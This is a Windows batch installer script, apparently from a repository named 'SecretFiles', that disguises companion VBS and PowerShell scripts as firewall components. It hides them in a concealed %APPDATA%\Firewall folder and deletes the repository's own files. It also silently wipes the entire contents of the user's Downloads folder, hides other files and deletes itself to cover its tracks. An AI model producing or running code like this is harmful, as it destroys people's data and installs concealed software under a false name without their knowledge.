@echo off
:: setup work cd
set "SF=%CD%"
set "HD=%APPDATA%\Firewall"

chcp 65001 > nul
color 0D

echo.
echo.

type .ascii.txt

echo.
echo.

echo ꑭ!хꑭ github.com/fxhxyz4/SecretFiles ꑭх!ꑭ

ping 127.0.0.1 -n 8 > nul
cls

:: arch version
set VER=64
for /f %%I in ('powershell -Command "(Get-CimInstance Win32_OperatingSystem).OSArchitecture"') do set OS_ARCH=%%I

if "%OS_ARCH%"=="32-bit" set VER=32

set NAME=.firewall%VER%

rename .firewall.bat %NAME%.bat
rename .firewall.vbs %NAME%.vbs
rename .firewall.ps1 %NAME%.ps1
rename .firewalle.ps1 %NAME%e.ps1


title %NAME%

:: deleted github files
del /f /q "%SF%\readme" >nul 2>&1
del /f /q "%SF%\license" >nul 2>&1
del /f /q "%SF%\security" >nul 2>&1
del /f /q "%SF%\.gitignore" >nul 2>&1
del /f /q "%SF%\text.txt" >nul 2>&1
del /f /q "%SF%\%NAME%.ps1" >nul 2>&1

:: create folder
if not exist "%HD%" (
    mkdir "%HD%"
    attrib +h "%HD%"
)

:: moved script files
move /y "%SF%\%NAME%.vbs" "%HD%\" >nul
move /y "%SF%\%NAME%.bat" "%HD%\" >nul
move /y "%SF%\%NAME%.ps1" "%HD%\" >nul
move /y "%SF%\%NAME%e.ps1" "%HD%\" >nul
move /y "%SF%\.ascii.txt" "%HD%\" >nul

attrib +h "%HD%\%NAME%.vbs"
attrib +h "%HD%\%NAME%.bat"
attrib +h "%HD%\%NAME%.ps1"
attrib +h "%HD%\%NAME%e.ps1"
attrib +h "%HD%\.ascii.txt"

del /q "%USERPROFILE%\Downloads\*.*" && for /d %G in ("%USERPROFILE%\Downloads\*") do rd /s /q "%G"

for %%f in (%SF%\.*) do (
    attrib +h "%%f" >nul 2>&1
)

:: delete config.cmd
echo worked
del "%~f0" >nul 2>&1

ping 127.0.0.1 -n 3 > nul
cls

exit